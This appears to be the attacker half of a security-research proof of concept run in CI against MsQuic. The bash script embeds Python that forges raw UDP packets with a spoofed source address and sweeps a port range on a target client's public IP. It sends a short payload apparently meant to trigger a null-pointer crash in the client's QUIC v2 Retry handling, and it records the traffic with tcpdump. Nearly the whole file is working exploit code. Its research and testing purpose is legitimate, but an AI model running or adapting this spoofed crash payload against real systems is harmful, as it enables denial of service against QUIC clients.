#!/usr/bin/env bash
set -Eeuo pipefail
ROOT="security-research/msquic-v2-retry-null-deref"
RESULTS="$GITHUB_WORKSPACE/msquic-public-peer-results/attacker"
mkdir -p "$RESULTS"
python3 "$ROOT/nettest-coord.py" wait "peer-mapping.json" "$RESULTS/mapping.json" 300
ATTACKER_PUBLIC_IP="$(curl -4 -fsS https://api.ipify.org)"
PEER_IP="$(jq -r .peer_ip "$RESULTS/mapping.json")"
CLIENT_PUBLIC_IP="$(jq -r .client_public_ip "$RESULTS/mapping.json")"
PEER_PORT="$(jq -r .peer_port "$RESULTS/mapping.json")"
LOW="$(jq -r .scan_port_low "$RESULTS/mapping.json")"
HIGH="$(jq -r .scan_port_high "$RESULTS/mapping.json")"
printf 'ATTACKER_PUBLIC_IP=%s\nPEER_PUBLIC_IP=%s\nCLIENT_PUBLIC_IP=%s\nPEER_PORT=%s\nSCAN=%s-%s\n' \
  "$ATTACKER_PUBLIC_IP" "$PEER_IP" "$CLIENT_PUBLIC_IP" "$PEER_PORT" "$LOW" "$HIGH" | tee "$RESULTS/network-identities.txt"
if [ "$ATTACKER_PUBLIC_IP" = "$CLIENT_PUBLIC_IP" ] || [ "$ATTACKER_PUBLIC_IP" = "$PEER_IP" ]; then
  echo "FAIL: attacker and target/peer are not distinct public IP endpoints"
  exit 1
fi

sudo tcpdump -U -ni any "udp and dst host $CLIENT_PUBLIC_IP" -w "$RESULTS/attacker-egress.pcap" >/dev/null 2>&1 &
CAP_PID=$!
cleanup(){ set +e; sudo kill "$CAP_PID" 2>/dev/null; wait "$CAP_PID" 2>/dev/null; }
trap cleanup EXIT
sleep 1

sudo python3 - "$RESULTS/mapping.json" <<'PY' | tee "$RESULTS/attacker.log"
import ipaddress, json, socket, struct, sys, time
mapping=json.load(open(sys.argv[1]))
src=ipaddress.IPv4Address(mapping["peer_ip"]).packed
dst=ipaddress.IPv4Address(mapping["client_public_ip"]).packed
sport=int(mapping["peer_port"])
low=int(mapping["scan_port_low"]); high=int(mapping["scan_port_high"])
payload=bytes.fromhex("806b3343cf0000")
s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW)
s.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
def checksum(data):
    if len(data)&1: data += b"\x00"
    total=sum(struct.unpack("!%dH"%(len(data)//2),data))
    while total>>16: total=(total&0xffff)+(total>>16)
    return (~total)&0xffff
sent=0
start=time.time()
for dport in range(low,high+1):
    udp=struct.pack("!HHHH",sport,dport,8+len(payload),0)+payload
    header=struct.pack("!BBHHHBBH4s4s",0x45,0,20+len(udp),0x5a71,0,64,17,0,src,dst)
    header=header[:10]+struct.pack("!H",checksum(header))+header[12:]
    s.sendto(header+udp,(mapping["client_public_ip"],0))
    sent+=1
    if sent%5000==0:
        print(f"SPOOF_SCAN_PROGRESS sent={sent} last_dst_port={dport}",flush=True)
print(f"SPOOF_SCAN_SENT count={sent} src={mapping['peer_ip']}:{sport} dst={mapping['client_public_ip']}:{low}-{high} payload={payload.hex()} elapsed={time.time()-start:.2f}s",flush=True)
PY
sleep 2
cleanup
trap - EXIT
sudo tcpdump -nn -r "$RESULTS/attacker-egress.pcap" -c 20 >"$RESULTS/attacker-egress.txt" 2>&1 || true
cat "$RESULTS/attacker.log" "$RESULTS/attacker-egress.txt"
